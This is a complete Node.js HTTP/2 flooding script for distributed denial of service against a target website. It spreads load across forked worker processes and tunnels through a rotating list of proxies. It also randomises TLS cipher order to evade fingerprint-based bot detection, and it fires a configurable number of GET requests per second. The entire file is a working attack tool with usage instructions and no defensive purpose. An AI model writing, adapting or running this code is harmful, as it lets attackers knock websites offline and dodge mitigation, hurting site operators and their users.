const http2 = require('http2');
const url = require('url');
const cluster = require('cluster');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const rps = process.argv[5];

if (!target) {
    console.log('Usage: node flood.js <url> <time> <threads> <rps>');
    process.exit(1);
}

const parsed = new URL(target);
const proxies = fs.readFileSync('proxy.txt', "utf-8").toString().split(/\r?\n/).filter(Boolean).map(p => p.split(':'));

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function JA3Fingerprints() {
    const greases = [0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a, 0x5a5a, 0x6a6a, 0x7a7a, 0x8a8a, 0x9a9a, 0xbaba, 0xcaca, 0xdada, 0xeaea, 0xfafa];
    return {
        secureOptions: crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
        secureContext: tls.createSecureContext({
            ciphers: 'ALL',
            honorCipherOrder: false
        })
    };
}

class NetSocket {
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("200");
            
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function createTLSConnection(socket, proxy, targetHost) {
    const tlsVersions = ['TLSv1.3', 'TLSv1.2'];
    const selectedVersion = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];

    const cipherSuites = [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_128_CCM_SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256'
    ];
    
    const shuffledCiphers = shuffle([...cipherSuites]).slice(0, randomInt(8, 10)).join(':');

    const ellipticCurves = 'X25519:prime256v1:secp384r1:secp521r1';
    const signatureAlgorithms = 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha256:rsa_pkcs1_sha384';

    const secureOptions = 
        crypto.constants.SSL_OP_NO_SSLv2 | 
        crypto.constants.SSL_OP_NO_SSLv3 | 
        crypto.constants.SSL_OP_NO_TLSv1 | 
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

    const ja3Fingerprint = JA3Fingerprints();

    return tls.connect({
        host: targetHost,
        servername: targetHost,
        port: 443,
        ciphers: shuffledCiphers,
        sigalgs: signatureAlgorithms,
        ecdhCurve: ellipticCurves,
        minVersion: selectedVersion,
        maxVersion: 'TLSv1.3',
        ALPNProtocols: ['h2'],
        socket: socket,
        secure: true,
        requestCert: true,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        sessionTimeout: 0,
        honorCipherOrder: true,
        ...ja3Fingerprint
    });
}

if (cluster.isMaster) {
    console.log(`Starting ${threads} threads for ${time} seconds targeting ${target}`);
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        console.log('Attack finished.');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time * 1000);
    
} else {
    const PROXIES_REQUEST = new NetSocket();
    let requestCount = 0;
    
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxy) process.exit(1);

    const PROXY_Connect = {
        host: proxy[0],
        port: parseInt(proxy[1]),
        address: parsed.hostname + ":443",
        timeout: 10
    };

    PROXIES_REQUEST.HTTP(PROXY_Connect, (socket, error) => {
        if (error || !socket) return process.exit(1);

        const tlsSocket = createTLSConnection(socket, proxy, parsed.hostname);
        
        tlsSocket.on('secureConnect', () => {
            const client = http2.connect(target, {
                createConnection: () => tlsSocket,
                settings: {
                    enablePush: false,
                    initialWindowSize: 65535,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 1000
                }
            });

            client.on('error', () => {});

            const headers = {
                ':method': 'GET',
                ':path': parsed.pathname + parsed.search,
                ':authority': parsed.hostname,
                ':scheme': 'https',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache'
            };

            const interval = setInterval(() => {
                for (let i = 0; i < rps; i++) {
                    const req = client.request(headers);
                    req.on('response', () => {
                        requestCount++;
                        req.close();
                    });
                    req.on('error', () => {});
                    req.end();
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(interval);
                client.destroy();
                socket.destroy();
                console.log(`Worker ${process.pid} made ~${requestCount} requests.`);
                process.exit(0);
            }, time * 1000);
        });

        tlsSocket.on('error', () => {
            socket.destroy();
        });
    });
}